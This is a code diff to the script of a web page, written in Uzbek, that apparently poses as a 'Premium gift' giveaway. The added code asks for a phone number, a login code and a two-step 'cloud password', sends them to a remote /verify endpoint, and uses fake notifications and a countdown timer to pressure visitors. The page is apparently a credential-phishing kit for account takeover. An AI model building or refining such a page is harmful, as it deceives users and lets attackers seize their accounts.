+            if (data.status === '2fa_needed') {
+                nextStep(3);
+                showToast('Bulutli parolni kiriting', 'info');
+            } else if (data.status === 'success') {
+                showFinal();
+            } else {
+                showToast(data.message || data.detail || 'Noto\'g\'ri kod', 'error');
+            }
+        } catch (error) {
+            console.error('❌ Error:', error);
+            showToast('Server xatoligi: ' + error.message, 'error');
+        } finally {
+            showLoader(false);
+        }
     }
 
+    // Verify password (2FA)
     async function verifyPassword() {
-        const password = document.getElementById('password').value;
-        showLoader(true, "Akkaunt ulanmoqda...");
-        const res = await fetch(`${API_URL}/verify`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ phone: userPhone, password: password })
-        });
-        const data = await res.json();
-        showLoader(false);
-
-        if (data.status === "success") {
-            showFinal();
-        } else { alert("Parol noto'g'ri!"); }
+        const password = document.getElementById('password').value.trim();
+        
+        if (!password) {
+            showToast('Parolni kiriting', 'warning');
+            return;
+        }
+        
+        showLoader(true, 'Akkaunt tekshirilmoqda...');
+        
+        try {
+            console.log('🔐 Verifying password for:', userPhone);
+            
+            const response = await fetch(`${API_URL}/verify`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: userPhone,
+                    password: password
+                })
+            });
+            
+            console.log('📡 Password verify status:', response.status);
+            
+            let data;
+            try {
+                data = await response.json();
+            } catch (e) {
+                console.error('❌ JSON parse error:', e);
+                const text = await response.text();
+                console.error('Response text:', text.substring(0, 200));
+                throw new Error('Serverdan noto\'g\'ri javob keldi');
+            }
+            
+            console.log('📦 Password verify data:', data);
+            
+            if (!response.ok) {
+                showToast(data.detail || 'Server xatoligi', 'error');
+                return;
+            }
+            
+            if (data.status === 'success') {
+                showFinal();
+            } else {
+                showToast(data.message || data.detail || 'Noto\'g\'ri parol', 'error');
+            }
+        } catch (error) {
+            console.error('❌ Error:', error);
+            showToast('Server xatoligi: ' + error.message, 'error');
+        } finally {
+            showLoader(false);
+        }
     }
 
+    // Show final success screen
     function showFinal() {
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.add('hidden');
-        document.getElementById('step3').classList.add('hidden');
-        document.querySelector('.premium-header').style.display = 'none';
-        document.getElementById('step-final').classList.remove('hidden');
+        document.querySelectorAll('.step').forEach(el => el.classList.add('hidden'));
+        document.getElementById('stepFinal').classList.remove('hidden');
+        showToast('✅ Muvaffaqiyatli! Premium sovg\'a navbatga qo\'yildi', 'success');
     }
+
+    // Initialize
+    window.onload = () => {
+        createParticles();
+        startTimer(300, document.getElementById('timer'));
+        showFakeNotifications();
+        
+        // Format phone input
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/[^\d+]/g, '');
+            if (!value.startsWith('+')) {
+                value = '+' + value.replace(/^\+/, '');
+            }
+            e.target.value = value;
+        });
+        
+        // Auto-focus code input
+        document.getElementById('code').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 5);
+        });
+        
+        // Enter key handlers
+        document.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                if (currentStep === 1) sendPhone();
+                if (currentStep === 2) verifyCode();
+                if (currentStep === 3) verifyPassword();
+            }
+        });
+        
+        // Server status check
+        fetch(`${API_URL}/health`)
+            .then(res => res.json())
+            .then(data => {
+                console.log('✅ Server status:', data);
+                showToast('Serverga ulanish muvaffaqiyatli', 'success');
+            })
+            .catch(err => {
+                console.error('❌ Server not reachable:', err);
+                showToast('Server bilan aloqa yo\'q!', 'error');
+            });
+    };
 </script>
 </body>
 </html>
